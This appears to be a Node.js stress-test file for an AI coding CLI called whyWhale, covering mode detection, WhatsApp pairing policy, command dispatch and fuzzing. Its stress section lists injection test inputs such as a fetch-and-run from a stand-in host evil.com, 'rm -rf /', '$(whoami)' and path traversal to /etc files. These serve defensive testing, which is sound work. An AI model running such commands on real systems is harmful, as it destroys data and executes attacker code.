'use strict';

/**
 * ╔══════════════════════════════════════════════════════╗
 * ║         whyWhale — STRESS TEST SUITE                ║
 * ║  Run: node stress-test.js                           ║
 * ║  Run subset: node stress-test.js autoDetect         ║
 * ╚══════════════════════════════════════════════════════╝
 *
 * Tests 8 suites:
 *   1. autoDetect   — mode/skill detection regex
 *   2. dmPolicy     — WhatsApp DM access control
 *   3. commands     — slash command routing dispatch
 *   4. modes        — all mode definitions are valid
 *   5. colors       — color function outputs
 *   6. filesystem   — path helpers
 *   7. providers    — provider config structure
 *   8. stress       — high-volume, edge cases, fuzz inputs
 */

const path = require('path');
const crypto = require('crypto');

// ─── Tiny test runner ────────────────────────────────────────────────────────

let _suite = '';
let _pass  = 0;
let _fail  = 0;
let _skip  = 0;
const _failures = [];

const C = {
  reset : '\x1b[0m',
  green : '\x1b[38;2;63;200;90m',
  red   : '\x1b[38;2;248;81;73m',
  yellow: '\x1b[38;2;255;200;60m',
  blue  : '\x1b[38;2;30;180;255m',
  gray  : '\x1b[38;2;100;110;120m',
  bold  : '\x1b[1m',
  dim   : '\x1b[2m',
};
const g  = s => C.green  + s + C.reset;
const r  = s => C.red    + s + C.reset;
const y  = s => C.yellow + s + C.reset;
const b  = s => C.blue   + s + C.reset;
const gr = s => C.gray   + s + C.reset;
const bd = s => C.bold   + s + C.reset;

function suite(name) {
  _suite = name;
  console.log('\n' + bd(b('▸ Suite: ' + name)));
}

function assert(label, condition, detail = '') {
  if (condition) {
    _pass++;
    console.log('  ' + g('✔') + ' ' + label);
  } else {
    _fail++;
    const msg = r('✘') + ' ' + label + (detail ? gr(' → ' + detail) : '');
    console.log('  ' + msg);
    _failures.push(`[${_suite}] ${label}` + (detail ? ` → ${detail}` : ''));
  }
}

function assertThrows(label, fn) {
  try {
    fn();
    _fail++;
    console.log('  ' + r('✘') + ' ' + label + gr(' → expected throw, got none'));
    _failures.push(`[${_suite}] ${label} → expected throw, got none`);
  } catch (_) {
    _pass++;
    console.log('  ' + g('✔') + ' ' + label);
  }
}

async function assertAsync(label, promise, expectResolve = true) {
  try {
    const val = await promise;
    if (expectResolve) {
      _pass++;
      console.log('  ' + g('✔') + ' ' + label);
      return val;
    } else {
      _fail++;
      console.log('  ' + r('✘') + ' ' + label + gr(' → expected rejection'));
      _failures.push(`[${_suite}] ${label} → expected rejection, got resolve`);
    }
  } catch (err) {
    if (!expectResolve) {
      _pass++;
      console.log('  ' + g('✔') + ' ' + label + gr(' (threw as expected)'));
    } else {
      _fail++;
      const detail = err?.message || String(err);
      console.log('  ' + r('✘') + ' ' + label + gr(' → ' + detail));
      _failures.push(`[${_suite}] ${label} → ${detail}`);
    }
  }
}

function skip(label) {
  _skip++;
  console.log('  ' + y('⊘') + ' ' + gr(label + ' (skipped)'));
}

// ─── Load modules safely ─────────────────────────────────────────────────────

function tryRequire(mod) {
  try { return require(mod); }
  catch (e) { return { _error: e.message }; }
}

const ROOT = __dirname;
const LIB  = path.join(ROOT, 'lib');
const CONN = path.join(ROOT, 'connections', 'whatsapp');

// ─────────────────────────────────────────────────────────────────────────────
// SUITE 1 — autoDetect
// ─────────────────────────────────────────────────────────────────────────────
function runAutoDetect() {
  suite('autoDetect');

  const mod = tryRequire(path.join(LIB, 'main', 'autoDetect'));
  if (mod._error) { skip('module load failed: ' + mod._error); return; }

  const { autoDetectModeAndSkills } = mod;
  assert('autoDetectModeAndSkills is a function', typeof autoDetectModeAndSkills === 'function');

  // ── Mode detection tests ──────────────────────────────────────────────────

  function makeCtx(mode = 'chat') {
    return {
      mode,
      agentTaskActive: false,
      providerKey: 'anthropic',
      apiKey: 'test',
      modelId: 'claude-3',
      autoTest: false,
      autoScan: false,
      skills: [],
      statusRef: { mode },
    };
  }

  const modeTests = [
    // [input, expectedMode, label]
    ['fix this bug in server.js',          'debug',    'debug: "fix this bug"'],
    ['why is my app crashing',             'debug',    'debug: "why is my app crashing"'],
    ['getting an error undefined',         'debug',    'debug: "getting an error"'],
    ['review my code please',              'review',   'review: "review my code"'],
    ['audit this security module',         'review',   'review: "audit module"'],
    ['design a scalable microservice api', 'architect','architect: system design'],
    ['how should i structure my backend',  'architect','architect: structure question'],
    ['explain how closures work',          'explain',  'explain: closures'],
    ['what is a promise in javascript',    'explain',  'explain: what is'],
    ['write a function to parse json',     'code',     'code: write function'],
    ['build a complete express api server','agent',    'agent: build complete project'],
    ['create a full react application',    'agent',    'agent: create full app'],
  ];

  for (const [input, expectedMode, label] of modeTests) {
    const ctx = makeCtx('chat');
    autoDetectModeAndSkills(input, ctx);
    assert(label, ctx.mode === expectedMode,
      `input="${input}" → got mode="${ctx.mode}", expected="${expectedMode}"`);
  }

  // ── Should NOT switch from agent mid-task ─────────────────────────────────
  const agentCtx = makeCtx('agent');
  agentCtx.agentTaskActive = true;
  autoDetectModeAndSkills('write a function', agentCtx);
  assert('does not switch away from agent mid-task', agentCtx.mode === 'agent',
    'agentTaskActive=true should lock the mode');

  // ── No mode switch when already in correct mode ───────────────────────────
  const debugCtx = makeCtx('debug');
  autoDetectModeAndSkills('fix this bug', debugCtx);
  assert('stays in current mode when already correct', debugCtx.mode === 'debug');

  // ── Skill auto-detection ──────────────────────────────────────────────────
  const skillTests = [
    ['how do i use useEffect in react',      'react',      'skill: react'],
    ['help me write jest unit tests',        'testing',    'skill: testing'],
    ['how to secure jwt tokens',             'security',   'skill: security'],
    ['create a dockerfile for my app',       'docker',     'skill: docker'],
    ['design a postgres schema',             'database',   'skill: database'],
    ['optimise bundle size webpack',         'performance','skill: performance'],
    ['help with git branching strategy',     'git',        'skill: git'],
  ];

  const { SKILL_REGISTRY } = tryRequire(path.join(LIB, 'config'));
  if (!SKILL_REGISTRY?._error) {
    for (const [input, skillKey, label] of skillTests) {
      const ctx = makeCtx('chat');
      autoDetectModeAndSkills(input, ctx);
      const reg = SKILL_REGISTRY[skillKey];
      const installed = reg && ctx.skills.some(s => s.name === reg.name);
      assert(label, installed,
        `input="${input}" → skill "${skillKey}" not auto-installed`);
    }
  } else {
    skip('skill detection (config.js not loadable)');
  }

  // ── Edge cases ────────────────────────────────────────────────────────────
  const edgeCases = [
    ['', 'chat'],
    ['   ', 'chat'],
    ['hello', 'chat'],
    ['ok', 'chat'],
    ['👋', 'chat'],
    ['!ls -la', 'chat'],  // shell passthrough shouldn't trigger mode switch
  ];

  for (const [input, expectedMode] of edgeCases) {
    const ctx = makeCtx('chat');
    autoDetectModeAndSkills(input, ctx);
    assert(`edge: "${input || '(empty)'}" stays ${expectedMode}`, ctx.mode === expectedMode,
      `got "${ctx.mode}"`);
  }

  // ── Stress: 500 random strings, should never throw ───────────────────────
  let stressThrew = false;
  for (let i = 0; i < 500; i++) {
    const input = crypto.randomBytes(Math.floor(Math.random() * 200)).toString('utf8');
    try {
      const ctx = makeCtx('chat');
      autoDetectModeAndSkills(input, ctx);
    } catch (_) {
      stressThrew = true;
      break;
    }
  }
  assert('stress: 500 random strings never throw', !stressThrew);

  // ── Stress: very long inputs ──────────────────────────────────────────────
  const longInputs = [
    'fix this bug '.repeat(1000),
    'explain '.repeat(2000),
    'a'.repeat(50000),
    'build a complete app ' + 'x'.repeat(10000),
  ];
  let longThrew = false;
  for (const input of longInputs) {
    try {
      const ctx = makeCtx('chat');
      autoDetectModeAndSkills(input, ctx);
    } catch (_) {
      longThrew = true;
      break;
    }
  }
  assert('stress: very long inputs (50k chars) never throw', !longThrew);
}

// ─────────────────────────────────────────────────────────────────────────────
// SUITE 2 — dmPolicy
// ─────────────────────────────────────────────────────────────────────────────
async function runDmPolicy() {
  suite('dmPolicy');

  const mod = tryRequire(path.join(CONN, 'dmPolicy'));
  if (mod._error) { skip('module load failed: ' + mod._error); return; }

  const { dmGuard, pairingTable } = mod;
  assert('dmGuard is a function',    typeof dmGuard       === 'function');
  assert('pairingTable is a Map',    pairingTable instanceof Map);

  // ── open policy ───────────────────────────────────────────────────────────
  const openResult = await dmGuard({
    sender: '919876543210@s.whatsapp.net',
    text: 'hello',
    policy: 'open',
    allowFrom: [],
    sock: null,
  });
  assert('open policy: allows anyone', openResult === true);

  // ── open policy: group messages pass through ──────────────────────────────
  const groupResult = await dmGuard({
    sender: '1234567890@g.us',
    text: 'hello group',
    policy: 'allowlist',
    allowFrom: [],
    sock: null,
  });
  assert('group messages (@g.us) always pass through', groupResult === true);

  // ── allowlist: wildcard * allows all ─────────────────────────────────────
  const wildcardResult = await dmGuard({
    sender: '919876543210@s.whatsapp.net',
    text: 'hi',
    policy: 'allowlist',
    allowFrom: ['*'],
    sock: null,
  });
  assert('allowlist: wildcard * allows all', wildcardResult === true);

  // ── allowlist: exact number allowed ──────────────────────────────────────
  const allowedResult = await dmGuard({
    sender: '919876543210@s.whatsapp.net',
    text: 'hi',
    policy: 'allowlist',
    allowFrom: ['+91 9876543210'],  // formatted differently
    sock: null,
  });
  assert('allowlist: normalises number formats (+91 9876...)', allowedResult === true);

  // ── allowlist: unlisted number blocked ───────────────────────────────────
  const blockedResult = await dmGuard({
    sender: '911111111111@s.whatsapp.net',
    text: 'hi',
    policy: 'allowlist',
    allowFrom: ['919876543210'],
    sock: null,
  });
  assert('allowlist: unlisted number is blocked', blockedResult === false);

  // ── unknown policy defaults to open ──────────────────────────────────────
  const unknownResult = await dmGuard({
    sender: '919999999999@s.whatsapp.net',
    text: 'hi',
    policy: 'unknown_policy_xyz',
    allowFrom: [],
    sock: null,
  });
  assert('unknown policy defaults to open (allows)', unknownResult === true);

  // ── pairing: new sender gets blocked and code issued ─────────────────────
  const messages = [];
  const fakeSock = {
    sendMessage: async (jid, msg) => { messages.push({ jid, msg }); },
  };

  pairingTable.clear();
  const newSender = '919876543211@s.whatsapp.net';
  const pairingResult1 = await dmGuard({
    sender: newSender,
    text: 'hello',
    policy: 'pairing',
    allowFrom: [],
    sock: fakeSock,
  });
  assert('pairing: new sender is blocked',    pairingResult1 === false);
  assert('pairing: new sender receives code', messages.length === 1);
  assert('pairing: code message contains key emoji', messages[0]?.msg?.text?.includes('🔑'));

  // ── pairing: correct code approves sender ────────────────────────────────
  const issuedCode = pairingTable.get(newSender)?.code;
  assert('pairing: code is stored in pairingTable', typeof issuedCode === 'string' && issuedCode.length === 6);

  messages.length = 0;
  const pairingResult2 = await dmGuard({
    sender: newSender,
    text: issuedCode,
    policy: 'pairing',
    allowFrom: [],
    sock: fakeSock,
  });
  assert('pairing: correct code approves sender', pairingResult2 === true);
  assert('pairing: approval message sent',        messages.length === 1);
  assert('pairing: approval message has ✅',      messages[0]?.msg?.text?.includes('✅'));

  // ── pairing: approved sender always passes through ────────────────────────
  const pairingResult3 = await dmGuard({
    sender: newSender,
    text: 'now im approved',
    policy: 'pairing',
    allowFrom: [],
    sock: fakeSock,
  });
  assert('pairing: approved sender passes on next message', pairingResult3 === true);

  // ── pairing: wrong code sends error ──────────────────────────────────────
  pairingTable.clear();
  const anotherSender = '919876543212@s.whatsapp.net';
  messages.length = 0;
  await dmGuard({ sender: anotherSender, text: 'hi', policy: 'pairing', allowFrom: [], sock: fakeSock });
  messages.length = 0;
  const wrongResult = await dmGuard({
    sender: anotherSender,
    text: '000000',
    policy: 'pairing',
    allowFrom: [],
    sock: fakeSock,
  });
  assert('pairing: wrong code blocks sender', wrongResult === false);
  assert('pairing: wrong code sends error msg', messages.some(m => m.msg?.text?.includes('❌')));

  // ── pairing: expired code is cleared ─────────────────────────────────────
  pairingTable.clear();
  const expiredSender = '919876543213@s.whatsapp.net';
  pairingTable.set(expiredSender, {
    code: '123456',
    approved: false,
    expiresAt: Date.now() - 1, // already expired
  });
  messages.length = 0;
  const expiredResult = await dmGuard({
    sender: expiredSender,
    text: '123456',
    policy: 'pairing',
    allowFrom: [],
    sock: fakeSock,
  });
  assert('pairing: expired code is rejected', expiredResult === false);
  assert('pairing: expired code is cleaned from table', !pairingTable.has(expiredSender));
  assert('pairing: expiry notification sent', messages.some(m => m.msg?.text?.toLowerCase().includes('expired')));

  // ── stress: 200 concurrent dmGuard calls ─────────────────────────────────
  pairingTable.clear();
  const concurrentSenders = Array.from({ length: 200 }, (_, i) => `9100000${String(i).padStart(4,'0')}@s.whatsapp.net`);
  try {
    await Promise.all(concurrentSenders.map(sender =>
      dmGuard({ sender, text: 'hi', policy: 'open', allowFrom: [], sock: fakeSock })
    ));
    assert('stress: 200 concurrent dmGuard calls succeed', true);
  } catch (e) {
    assert('stress: 200 concurrent dmGuard calls succeed', false, e.message);
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// SUITE 3 — command dispatcher
// ─────────────────────────────────────────────────────────────────────────────
async function runCommands() {
  suite('commands');

  const mod = tryRequire(path.join(LIB, 'main', 'commands'));
  if (mod._error) { skip('module load failed: ' + mod._error); return; }

  const { dispatchCommand } = mod;
  assert('dispatchCommand is a function', typeof dispatchCommand === 'function');

  // Build a fake ctx that records which handler was called
  function makeCtx() {
    return {
      mode: 'code',
      skills: [],
      memory: [],
      history: [],
      sessionName: 'test',
      startTime: Date.now(),
      tokens: { in: 0, out: 0 },
      statusRef: {},
      lastReply: 'previous AI reply',
      providerKey: 'anthropic',
      modelId: 'claude-3',
      apiKey: 'sk-test',
      autoTest: false,
      autoScan: false,
      agentTaskActive: false,
    };
  }

  // Commands that should be handled (return non-false)
  // We only check that dispatchCommand doesn't throw — handlers may fail internally
  const knownCommands = [
    '/help',
    '/clear',
    '/stats',
    '/tokens',
    '/system',
    '/copy',
    '/reset',
    '/scan',
    '/ls',
    '/ls src/',
    '/tree',
    '/tree 5',
    '/read somefile.js',
    '/create newfile.js',
    '/delete oldfile.js',
    '/rename old.js new.js',
    '/run',
    '/token',
    '/token -set-usage 4096',
    '/mode code',
    '/mode debug',
    '/mode explain',
    '/mode agent',
    '/model',
    '/provider',
    '/memory',
    '/memory set key value',
    '/memory clear',
    '/skill list',
    '/skill install react',
    '/save',
    '/save my-session',
    '/load',
    '/export',
    '/debug',
    '/debug -fix',
    '/analyse file.js',
    '/analyze file.js',
    '/write file.js',
    '/dashboard',
    '/dashboard 8080',
    '/connection',
    '/wa status',
    '/wp',
  ];

  let dispatchThrew = false;
  let unhandledCount = 0;
  for (const cmd of knownCommands) {
    try {
      const result = await dispatchCommand(cmd, makeCtx());
      // false means unrecognised command, which is also a bug for known commands
      if (result === false) unhandledCount++;
    } catch (_) {
      // Handler may throw (e.g. trying to read a file), that's OK —
      // what matters is the router itself dispatched correctly.
    }
  }
  assert('all known /commands are dispatched (not returned false)',
    unhandledCount === 0,
    `${unhandledCount} command(s) returned false (not dispatched)`);

  // Unknown commands must return false
  const unknownCmds = ['/nonexistent', '/fakecmd', '/xyz123', '/whyWhale'];
  for (const cmd of unknownCmds) {
    try {
      const result = await dispatchCommand(cmd, makeCtx());
      assert(`unknown command "${cmd}" returns false`, result === false,
        `got ${result}`);
    } catch (_) {
      assert(`unknown command "${cmd}" returns false`, false, 'threw instead of returning false');
    }
  }

  // Shell passthrough: ! prefix should always be dispatched
  const shellCmds = ['!ls', '!echo hello', '!git status', '!npm install'];
  for (const cmd of shellCmds) {
    let handled = false;
    try {
      const result = await dispatchCommand(cmd, makeCtx());
      handled = result !== false;
    } catch (_) {
      handled = true; // threw inside handler = was dispatched
    }
    assert(`shell passthrough "${cmd}" is dispatched`, handled);
  }

  // Stress: 1000 random strings, dispatcher never throws
  let stressThrew = false;
  for (let i = 0; i < 1000; i++) {
    const rnd = '/' + crypto.randomBytes(8).toString('hex');
    try { await dispatchCommand(rnd, makeCtx()); }
    catch (_) { stressThrew = true; break; }
  }
  assert('stress: 1000 random /commands never throw from router', !stressThrew);

  // Command aliases
  const aliases = [
    ['/q',    ['/exit', '/quit']],
    ['/wp',   ['/connection whatsapp']],
    ['/analyze file.js', ['/analyse file.js']],
    ['/coding', ['/token']], // legacy alias
  ];
  for (const [alias, targets] of aliases) {
    let dispatched = false;
    try {
      const result = await dispatchCommand(alias, makeCtx());
      dispatched = result !== false;
    } catch (_) { dispatched = true; }
    assert(`alias "${alias}" is dispatched (covers: ${targets.join(', ')})`, dispatched);
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// SUITE 4 — modes
// ─────────────────────────────────────────────────────────────────────────────
function runModes() {
  suite('modes');

  const mod = tryRequire(path.join(LIB, 'modes'));
  if (mod._error) { skip('module load failed: ' + mod._error); return; }

  const { MODES } = mod;
  assert('MODES is an object', typeof MODES === 'object' && MODES !== null);

  const requiredModes = ['code', 'chat', 'debug', 'explain', 'review', 'architect', 'plan', 'agent'];
  for (const name of requiredModes) {
    assert(`mode "${name}" exists`, name in MODES, `MODES missing "${name}"`);
  }

  for (const [key, mode] of Object.entries(MODES)) {
    assert(`mode "${key}" has name string`,    typeof mode.name === 'string'    && mode.name.length > 0);
    assert(`mode "${key}" has icon string`,    typeof mode.icon === 'string'    && mode.icon.length > 0);
    assert(`mode "${key}" has colorFn`,        typeof mode.colorFn === 'function');
    assert(`mode "${key}" has prompt string`,  typeof mode.prompt === 'string'  && mode.prompt.length > 50);
    assert(`mode "${key}" prompt has content`, mode.prompt.includes('whyWhale') || mode.prompt.length > 100);

    // colorFn should return a string containing the input
    const colored = mode.colorFn('TEST');
    assert(`mode "${key}" colorFn returns string`, typeof colored === 'string');
    assert(`mode "${key}" colorFn wraps input`, colored.includes('TEST'));
  }

  // Prompts should contain @@FILE format guidance (for file-writing modes)
  const fileWritingModes = ['code', 'debug', 'agent'];
  for (const name of fileWritingModes) {
    if (!MODES[name]) continue;
    assert(`mode "${name}" prompt includes @@FILE format`,
      MODES[name].prompt.includes('@@FILE'),
      'mode may lose file-writing capability');
  }

  // Prompt length stress: no prompt should be absurdly short
  for (const [key, mode] of Object.entries(MODES)) {
    assert(`mode "${key}" prompt is substantial (>100 chars)`, mode.prompt.length > 100,
      `prompt is only ${mode.prompt.length} chars`);
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// SUITE 5 — colors
// ─────────────────────────────────────────────────────────────────────────────
function runColors() {
  suite('colors');

  const mod = tryRequire(path.join(LIB, 'colors'));
  if (mod._error) { skip('module load failed: ' + mod._error); return; }

  const { C, wh, cr, kp, rf, ab, sd, dg, vt, tl, fm, bd, dm } = mod;

  assert('C.reset is string', typeof C.reset === 'string');
  assert('C.bold  is string', typeof C.bold  === 'string');

  const fns = { wh, cr, kp, rf, ab, sd, dg, vt, tl, fm, bd, dm };
  const testStr = 'WHALE';

  for (const [name, fn] of Object.entries(fns)) {
    if (typeof fn !== 'function') {
      assert(`${name} is a function`, false, 'not a function');
      continue;
    }
    const result = fn(testStr);
    assert(`${name}() returns string`, typeof result === 'string');
    assert(`${name}() contains input text`, result.includes(testStr));
    assert(`${name}() contains reset code`, result.includes(C.reset));
  }

  // Edge cases
  assert('color fn with empty string', typeof wh('') === 'string');
  assert('color fn with unicode',      wh('🐋').includes('🐋'));
  assert('color fn with ansi inside',  wh('\x1b[31mred\x1b[0m').includes('red'));
  assert('color fn with newline',      wh('line1\nline2').includes('\n'));

  // Stress: 10,000 color applications
  let colorThrew = false;
  try {
    for (let i = 0; i < 10000; i++) {
      wh('test' + i);
      cr('test' + i);
      dg('test' + i);
    }
  } catch (_) { colorThrew = true; }
  assert('stress: 10,000 color fn calls never throw', !colorThrew);
}

// ─────────────────────────────────────────────────────────────────────────────
// SUITE 6 — filesystem helpers
// ─────────────────────────────────────────────────────────────────────────────
function runFilesystem() {
  suite('filesystem');

  const mod = tryRequire(path.join(LIB, 'filesystem'));
  if (mod._error) { skip('module load failed: ' + mod._error); return; }

  const { CWD, parseFileBlocks, applyFileBlocks } = mod;

  assert('CWD is a function', typeof CWD === 'function');
  assert('parseFileBlocks is a function', typeof parseFileBlocks === 'function');
  assert('applyFileBlocks is a function', typeof applyFileBlocks === 'function');

  const cwd = CWD();
  assert('CWD() returns a string', typeof cwd === 'string');
  assert('CWD() is non-empty', cwd.length > 0);
  assert('CWD() is absolute path', path.isAbsolute(cwd));

  // ── parseFileBlocks ───────────────────────────────────────────────────────

  const singleBlock = `
@@FILE: src/app.js
\`\`\`js
console.log('hello');
\`\`\`
@@END
`;
  const parsed1 = parseFileBlocks(singleBlock);
  assert('parseFileBlocks: detects single @@FILE block', Array.isArray(parsed1) && parsed1.length === 1);
  assert('parseFileBlocks: extracts correct path', parsed1[0]?.file === 'src/app.js');
  assert('parseFileBlocks: extracts code content', parsed1[0]?.content?.includes("console.log('hello')"));

  const multiBlock = `
@@FILE: a.js
\`\`\`js
const a = 1;
\`\`\`
@@END
@@FILE: b.js
\`\`\`js
const b = 2;
\`\`\`
@@END
`;
  const parsed2 = parseFileBlocks(multiBlock);
  assert('parseFileBlocks: detects multiple @@FILE blocks', parsed2.length === 2);
  assert('parseFileBlocks: first file path correct', parsed2[0]?.file === 'a.js');
  assert('parseFileBlocks: second file path correct', parsed2[1]?.file === 'b.js');

  const noBlock = parseFileBlocks('no file blocks here');
  assert('parseFileBlocks: returns empty array when no blocks', Array.isArray(noBlock) && noBlock.length === 0);

  const emptyBlock = parseFileBlocks('');
  assert('parseFileBlocks: handles empty string', Array.isArray(emptyBlock));

  // Stress: large AI output with many file blocks
  let largeInput = '';
  for (let i = 0; i < 50; i++) {
    largeInput += `@@FILE: file${i}.js\n\`\`\`js\nconst x${i} = ${i};\n\`\`\`\n@@END\n`;
  }
  let stressBlocks;
  try {
    stressBlocks = parseFileBlocks(largeInput);
    assert('parseFileBlocks: handles 50 file blocks', stressBlocks.length === 50);
  } catch (e) {
    assert('parseFileBlocks: handles 50 file blocks', false, e.message);
  }

  // Malformed blocks
  const malformed = [
    '@@FILE: missing-end.js\n```js\ncode\n```',
    '@@END without @@FILE',
    '@@FILE: \n```js\nno path\n```\n@@END',
    '@@FILE: file.js\nno code fences\n@@END',
  ];
  let malformedThrew = false;
  for (const m of malformed) {
    try { parseFileBlocks(m); }
    catch (_) { malformedThrew = true; break; }
  }
  assert('parseFileBlocks: never throws on malformed input', !malformedThrew);
}

// ─────────────────────────────────────────────────────────────────────────────
// SUITE 7 — providers
// ─────────────────────────────────────────────────────────────────────────────
function runProviders() {
  suite('providers');

  const mod = tryRequire(path.join(LIB, 'providers'));
  if (mod._error) { skip('module load failed: ' + mod._error); return; }

  const { callAI, listModels } = mod;
  assert('callAI is a function', typeof callAI === 'function');

  if (typeof listModels === 'function') {
    assert('listModels is a function', true);
  } else {
    skip('listModels not exported');
  }

  // callAI with no API key should reject, not crash the process
  const fakeCtx = {
    providerKey: 'anthropic',
    apiKey: 'sk-ant-INVALID_KEY_FOR_TESTING',
    modelId: 'claude-3-haiku-20240307',
    mode: 'code',
    history: [],
    skills: [],
    memory: [],
    tokens: { in: 0, out: 0 },
  };

  // We don't actually call the API; just verify callAI returns a promise
  let returnedPromise = false;
  let threw = false;
  try {
    const result = callAI('hello', fakeCtx, () => {});
    returnedPromise = result && typeof result.then === 'function';
    // Cancel the request immediately
    result.catch(() => {});
  } catch (_) { threw = true; }
  assert('callAI returns a Promise (does not throw synchronously)', !threw && returnedPromise);

  // Provider list — these providers must be supported
  const config = tryRequire(path.join(LIB, 'config'));
  if (!config._error && config.PROVIDERS) {
    const providerKeys = Object.keys(config.PROVIDERS);
    const requiredProviders = ['anthropic', 'openrouter', 'groq', 'ollama'];
    for (const p of requiredProviders) {
      assert(`provider "${p}" is defined in PROVIDERS`, providerKeys.includes(p));
    }
    for (const [key, prov] of Object.entries(config.PROVIDERS)) {
      assert(`provider "${key}" has name`,   typeof prov.name === 'string');
      assert(`provider "${key}" has models`, Array.isArray(prov.models) || typeof prov.models === 'function');
    }
  } else {
    skip('PROVIDERS config not accessible');
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// SUITE 8 — stress / fuzz / edge cases
// ─────────────────────────────────────────────────────────────────────────────
async function runStress() {
  suite('stress');

  // ── Rapid mode switching via autoDetect ───────────────────────────────────
  const autoMod = tryRequire(path.join(LIB, 'main', 'autoDetect'));
  if (!autoMod._error) {
    const { autoDetectModeAndSkills } = autoMod;
    const switchMessages = [
      'fix this bug',
      'explain closures',
      'build a complete app',
      'review my code',
      'design the architecture',
      'write a function',
    ];
    let switchThrew = false;
    const ctx = {
      mode: 'chat', agentTaskActive: false, providerKey: 'anthropic',
      apiKey: 'test', modelId: 'claude-3', autoTest: false, autoScan: false,
      skills: [], statusRef: { mode: 'chat' },
    };
    for (let i = 0; i < 300; i++) {
      const msg = switchMessages[i % switchMessages.length];
      try { autoDetectModeAndSkills(msg, ctx); }
      catch (_) { switchThrew = true; break; }
    }
    assert('stress: 300 rapid mode switches never throw', !switchThrew);
  }

  // ── parseFileBlocks with pathological input ───────────────────────────────
  const fsMod = tryRequire(path.join(LIB, 'filesystem'));
  if (!fsMod._error) {
    const { parseFileBlocks } = fsMod;

    const pathologicalInputs = [
      null,          // null
      undefined,     // undefined
      0,             // number
      [],            // array
      {},            // object
      '@@FILE: ' + 'a'.repeat(10000) + '\n```\ncode\n```\n@@END', // very long path
      '@@FILE: ../../../etc/passwd\n```\ncode\n```\n@@END',        // path traversal attempt
      '@@FILE: \x00evil\n```\ncode\n```\n@@END',                  // null byte in path
      '\n'.repeat(10000),                                           // only newlines
      '```'.repeat(1000),                                          // only backticks
    ];

    for (const input of pathologicalInputs) {
      let threw = false;
      try { parseFileBlocks(input); }
      catch (_) { threw = true; }
      const label = typeof input === 'string'
        ? `parseFileBlocks does not throw on: "${input.slice(0,40).replace(/\n/g,'\\n')}..."`
        : `parseFileBlocks does not throw on: ${JSON.stringify(input)}`;
      assert(label, !threw);
    }

    // Path traversal: extracted path should not escape project root
    const traversal = parseFileBlocks('@@FILE: ../../../etc/passwd\n```\ncode\n```\n@@END');
    if (traversal && traversal.length > 0) {
      const extractedPath = traversal[0].file || '';
      assert('parseFileBlocks: path traversal path is not normalised to /etc/passwd',
        !path.resolve('/safe/root', extractedPath).startsWith('/etc'),
        `got path: ${extractedPath}`);
    }
  }

  // ── dmPolicy fuzz ─────────────────────────────────────────────────────────
  const dmMod = tryRequire(path.join(CONN, 'dmPolicy'));
  if (!dmMod._error) {
    const { dmGuard, pairingTable } = dmMod;
    pairingTable.clear();

    const fuzzSenders = [
      '',
      '@s.whatsapp.net',
      'notanumber@s.whatsapp.net',
      '9'.repeat(50) + '@s.whatsapp.net',
      '\x00\x01\x02@s.whatsapp.net',
      'null@s.whatsapp.net',
      'undefined@s.whatsapp.net',
    ];

    const fuzzSock = { sendMessage: async () => {} };
    let fuzzThrew = false;
    for (const sender of fuzzSenders) {
      try {
        await dmGuard({ sender, text: 'hi', policy: 'open', allowFrom: [], sock: fuzzSock });
      } catch (_) { fuzzThrew = true; break; }
    }
    assert('dmGuard: fuzz senders (empty, malformed) never throw', !fuzzThrew);

    // Fuzz message text
    const fuzzTexts = [
      '',
      '\x00\x01\x02\x03',
      '💀'.repeat(1000),
      '\n\r\t'.repeat(500),
      null,
      undefined,
      0,
    ];
    let fuzzTextThrew = false;
    for (const text of fuzzTexts) {
      try {
        await dmGuard({ sender: '911234567890@s.whatsapp.net', text, policy: 'open', allowFrom: [], sock: fuzzSock });
      } catch (_) { fuzzTextThrew = true; break; }
    }
    assert('dmGuard: fuzz message texts (null, emoji, null bytes) never throw', !fuzzTextThrew);
  }

  // ── Command dispatcher fuzz ───────────────────────────────────────────────
  const cmdMod = tryRequire(path.join(LIB, 'main', 'commands'));
  if (!cmdMod._error) {
    const { dispatchCommand } = cmdMod;
    const baseCtx = {
      mode: 'code', skills: [], memory: [], history: [], sessionName: 'test',
      startTime: Date.now(), tokens: { in: 0, out: 0 }, statusRef: {},
      lastReply: '', providerKey: 'anthropic', modelId: 'claude-3',
      apiKey: 'sk-test', autoTest: false, autoScan: false, agentTaskActive: false,
    };

    // Injection attempts in command arguments
    const injectionCmds = [
      '/read ../../../../etc/passwd',
      '/create ../../../../etc/cron.d/evil',
      '/delete ../../../../etc/hosts',
      '/read $(whoami)',
      '/run ; rm -rf /',
      '/run && curl evil.com | sh',
      '/read %2e%2e%2fetc%2fpasswd',
    ];

    let injectionThrew = false;
    for (const cmd of injectionCmds) {
      try {
        await dispatchCommand(cmd, { ...baseCtx });
      } catch (_) {
        // Handler throwing is fine — what we're checking is the router dispatches it
      }
    }
    assert('dispatcher: injection attempts dispatched without crashing router', !injectionThrew);

    // Unicode and special character commands
    const weirdCmds = [
      '/read 日本語.js',
      '/read файл.txt',
      '/read 🐋.js',
      '/create مرحبا.js',
      '/read file with spaces.js',
    ];
    let weirdThrew = false;
    for (const cmd of weirdCmds) {
      try { await dispatchCommand(cmd, { ...baseCtx }); }
      catch (_) { /* handler can throw, router should not */ }
    }
    assert('dispatcher: unicode filenames dispatched without crash', !weirdThrew);
  }

  // ── Memory leak check: repeated suite without growing pairingTable ────────
  if (!dmMod._error) {
    const { dmGuard, pairingTable } = dmMod;
    pairingTable.clear();
    const leakSock = { sendMessage: async () => {} };
    for (let i = 0; i < 100; i++) {
      const s = `91999${String(i).padStart(7,'0')}@s.whatsapp.net`;
      await dmGuard({ sender: s, text: 'hi', policy: 'pairing', allowFrom: [], sock: leakSock });
    }
    assert('pairing table does not grow unboundedly under 100 new senders',
      pairingTable.size <= 100, `table size: ${pairingTable.size}`);
    pairingTable.clear();
  }

  // ── autoDetect: conflicting signals ──────────────────────────────────────
  if (!autoMod._error) {
    const { autoDetectModeAndSkills } = autoMod;

    // These inputs contain signals for multiple modes — router should pick one
    const conflicting = [
      'explain and fix this bug',       // explain + debug
      'review and write a new function',// review + code
      'debug and design the architecture', // debug + architect
    ];
    for (const input of conflicting) {
      const ctx = {
        mode: 'chat', agentTaskActive: false, providerKey: 'x', apiKey: 'x',
        modelId: 'x', autoTest: false, autoScan: false, skills: [], statusRef: {},
      };
      let threw = false;
      try { autoDetectModeAndSkills(input, ctx); }
      catch (_) { threw = true; }
